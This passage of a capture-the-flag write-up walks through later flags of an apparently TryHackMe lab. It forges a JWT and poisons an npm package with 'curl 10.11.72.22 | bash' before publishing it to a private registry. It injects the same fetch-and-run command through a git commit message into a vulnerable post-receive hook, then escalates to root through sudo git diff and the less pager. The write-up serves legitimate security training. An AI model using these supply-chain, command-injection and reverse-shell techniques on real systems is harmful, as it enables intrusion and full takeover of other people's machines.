9e0b831d786c:/app/bfc_thehubuat/assets# cat jwks.json
{"keys": [{
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "FdIGp1xoPOzfAm/9qZgMPIBI7rk=",
    "alg": "RS256",
    "n": "kfJbZeiM46fdyzh7hgnzIo5JmYdgusbZQHH0NAIwlTXD8Rd-3yPwkqV4U76BOGptVyMzpYpmh9D0WWc4VPTo2NOZ8pUNTaQnk-SKhvzYV37UWeY3ySBH1fsKcwUHWwqLSO1KvfNZiNPXn5_tH2hxIfjgotdhnuGUgjijs0ORN_fkveVYj8VlPSVfOXJpda_mqwpOtkpd1zdCXb3qbZ0e3UwQyiohU215EOTDL551EjZOqHgXEvs98jZFjJvYE8ZRNPkGmte2UcW8n-yTD_qgqXH0HPDqswXehf0BsycwSZ0y4mZI8nw-eDWbv31zx1vtZ1qNRE2X4jL5H8FAlyZTGw"
}]}
```

Now, using the private key we generated, we sign a **JWT** with `{"username": "mcskidy-adm"}` as the payload.

![Burp Sign Jwt](burp_sign_jwt.webp){: width="1000" height="500"}

After that, using the signed **JWT** with the `Authorization` header, we can see that we are now able to authenticate and access the endpoints on the servers.

![Web 300 Authenticaed](web_3000_authenticated.webp){: width="1000" height="500" }

Since we are able to reinstall **Node.js** modules and restart a service using this server, and seeing that the `admdev` server uses the **Node.js** registry at `http://npm-registry.bestfestivalcompany.thm:4873/` for the modules, we can use this to hijack a module it uses to run commands on it.

```console
$ cat admdev/.npmrc
registry=http://npm-registry.bestfestivalcompany.thm:4873/
```

For this, first, let's find a package to hijack. From the source code, we can see that it only imports the `express` module.

```console
$ cat admdev/index.js
const express = require('express');
...
```

But checking the dependencies for `express`, we can find many other modules, and since it does not specify an exact version for the `content-type` module, let's go with that.

![Express Dependencies](express_dependencies.webp){: width="1200" height="600" }

First, downloading the module and extracting the archive.

![Web Npmregistry Content Type](web_npmregistry_content_type.webp){: width="1200" height="600"}

After that, adding our reverse shell payload to the `index.js` file as such:

```console
$ head index.js
/*!
 * content-type
 * Copyright(c) 2015 Douglas Christopher Wilson
 * MIT Licensed
 */

'use strict'

const { execSync } = require('child_process');
execSync("curl 10.11.72.22 | bash");
```

We also modify the `package.json` file and increase the version by modifying the value for `version`.

```console
$ head package.json
{
  "name": "content-type",
  "description": "Create and parse HTTP Content-Type header",
  "version": "1.0.6",
  "author": "Douglas Christopher Wilson <doug@somethingdoug.com>",
  "license": "MIT",
  "keywords": [
    "content-type",
    "http",
    "req",
```

Now, we configure `npm` to use the auth token we discovered in the `/root/.npmrc` file.

```console
$ npm config set //172.16.1.2:4873/:_authToken OWI1MmY3MzA0MDEyZmVkYTIwMzdjMTZmZDhjZjA1ZmQ6OGJiNjQxM2Y0NDYzZDZiMGRiMWI2NGY2ZjhkOWU2OWJlNTk0M2VkNzg5OTU5NDM2NjkyMDdm
```

After that, we can publish the modified version to the registry.

```console
$ proxychains -q npm publish --registry=http://172.16.1.2:4873
npm notice
npm notice 📦  content-type@1.0.6
npm notice === Tarball Contents ===
npm notice 523B  HISTORY.md
npm notice 1.1kB LICENSE
npm notice 2.8kB README.md
npm notice 5.1kB index.js
npm notice 1.1kB package.json
npm notice === Tarball Details ===
npm notice name:          content-type
npm notice version:       1.0.6
npm notice filename:      content-type-1.0.6.tgz
npm notice package size:  4.0 kB
npm notice unpacked size: 10.6 kB
npm notice shasum:        1c235be505db3fb15a3866374511ec64504b7ea7
npm notice integrity:     sha512-vT7I8DOsL6Was[...]+zrVzn0Ti3mOg==
npm notice total files:   5
npm notice
npm notice Publishing to http://172.16.1.2:4873/ with tag latest and default access
+ content-type@1.0.6
```

Next, using the `admint` server at `http://172.16.1.2:3000/`, we can first reinstall the **Node.js** modules for the `admdev` server by making a request to `/reinstall-node-modules` as such:

![Web 3000 Reinstall Node Modules](web_3000_reinstall_node_modules.webp){: width="1000" height="500"}

We then make a request to the `/restart-service` endpoint to restart the `admdev` server.

![Web 3000 Restart Service](web_3000_restart_service.webp){: width="1000" height="500"}

With this, we get a shell as `root` inside the `172.16.1.2` container and can read the second flag at `/flag-1c12bcbb1fee96a928d4f89550dcb60d.txt`.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.165.202] 48674
/app/admdev # python3 -c 'import pty;pty.spawn("/bin/bash");'
6238c1cc6eec:/app/admdev# export TERM=xterm
6238c1cc6eec:/app/admdev# ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg

6238c1cc6eec:/app/admdev# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
6238c1cc6eec:/app/admdev# wc -c /flag-1c12bcbb1fee96a928d4f89550dcb60d.txt
38 /flag-1c12bcbb1fee96a928d4f89550dcb60d.txt
```

### Third Flag

With a shell on the container, we now also gain access to the private key at `/app/admint/root.key`.

```console
6238c1cc6eec:/app/admint# ls -la root.key
-rw-------    1 root     root           513 Dec 15 23:23 root.key
```

Once again, using this key to authenticate to the **SSH** server on the host as the `git` user, we see that we authenticate as the `developer` user to **gitolite3** instead of the `backup` user from before and gain access to two new repositories: `gitolite-admin` and `hooks_wip`. Additionally, we now have write access to the `admdev` repository.

```console
$ ssh -i root.key git@bestfestivalcompany.thm
PTY allocation request failed on channel 0
hello developer, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R W    admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      gitolite-admin
 R      hooks_wip
 R      underconstruction
Connection to bestfestivalcompany.thm closed.
```

Cloning the `hooks_wip` repository and checking it, we see a single `post-receive` hook inside.

```console
$ GIT_SSH_COMMAND="ssh -i root.key" git clone git@bestfestivalcompany.thm:hooks_wip.git
$ ls -la hooks_wip
total 16
drwxrwxr-x 3 kali kali 4096 Dec 26 18:01 .
drwxrwxr-x 7 kali kali 4096 Dec 26 18:01 ..
drwxrwxr-x 8 kali kali 4096 Dec 26 18:01 .git
-rw-rw-r-- 1 kali kali  494 Dec 26 18:01 post-receive
```

Examining the hook, which runs whenever a commit gets pushed, it reads the old and new revision and the reference name. If the new revision is not zero, it extracts the commit message using `git log` and writes it to the log file along with the date, reference name, and the commit message.

```bash
#!/bin/bash

LOGFILE="/home/git/gitolite-commit-messages.log"

while read oldrev newrev refname; do
    if [ "$newrev" != "0000000000000000000000000000000000000000" ]; then
        # Get the commit message
        commit_message=$(git --git-dir="$PWD" log -1 --format=%s "$newrev")
        bash -c "echo $(date) - Ref: $refname - Commit: $commit_message >> $LOGFILE"
    else
        # Log branch deletion
        bash -c "echo $(date) - Ref: $refname - Branch deleted >> $LOGFILE"
    fi
done
```

The problem is that there is a command injection vulnerability in this line with the `$commit_message`:

```bash
bash -c "echo $(date) - Ref: $refname - Commit: $commit_message >> $LOGFILE"
```

Since the commit message is user-controlled, we can inject commands into it, as shown below:

```console
$ commit_message='$(whoami)'; bash -c "echo Commit: $commit_message"
Commit: kali
```

Currently, the only repository we have write access to and thus can push changes is the `admdev` repository. Even though we don't know if this hook is present for that repository, we can still try to exploit this vulnerability.

```console
$ cd admdev
$ echo "jxf" > jxf
$ git config user.email "you@example.com"
$ git config user.name "Your Name"
$ git add jxf
$ git commit -m '$(curl 10.11.72.22|bash)'
$ GIT_SSH_COMMAND="ssh -i ../root.key" git push git@bestfestivalcompany.thm:admdev.git
```

Running these commands, we see the last `git push` command hangs, and we get a shell as the `git` user on the host on our listener.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.165.202] 43234
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
git@tryhackme-2404:~/repositories/admdev.git$ export TERM=xterm
git@tryhackme-2404:~/repositories/admdev.git$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

git@tryhackme-2404:~/repositories/admdev.git$ id
uid=115(git) gid=122(git) groups=122(git)
```

And we can read the third flag at `/home/git/flag-3bf841ea61e9a41b5e4ebb82a024a7cd.txt`.

```console
git@tryhackme-2404:~$ wc -c flag-3bf841ea61e9a41b5e4ebb82a024a7cd.txt
38 flag-3bf841ea61e9a41b5e4ebb82a024a7cd.txt
```

### Fourth Flag

Checking our `sudo` privileges as the `git` user, we can see that we are able to run the `/usr/bin/git --no-pager diff *` command as `root`.

```console
git@tryhackme-2404:~$ sudo -l
Matching Defaults entries for git on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User git may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/git --no-pager diff *
```

Even though we have to use the `--no-pager` argument, we can still use the `--help` argument to make it display the man page for the `git-diff`, which will use `less` as the pager, as such:

```console
git@tryhackme-2404:~$ sudo /usr/bin/git --no-pager diff --help
```

Now that we are running `less` as `root`, we can simply use the `!/bin/bash` command in it to spawn a shell as the `root` user.

![Sudo Less Shell](sudo_less_shell.webp){: width="1000" height="500" }

Lastly, we can read the fourth and final flag at `/root/flag-e116666ffb7fcfadc7e6136ca30f75bf.txt` to complete the challenge.

```console
root@tryhackme-2404:/home/git# id
uid=0(root) gid=0(root) groups=0(root),998(docker)
root@tryhackme-2404:/home/git# wc -c /root/flag-e116666ffb7fcfadc7e6136ca30f75bf.txt
38 /root/flag-e116666ffb7fcfadc7e6136ca30f75bf.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>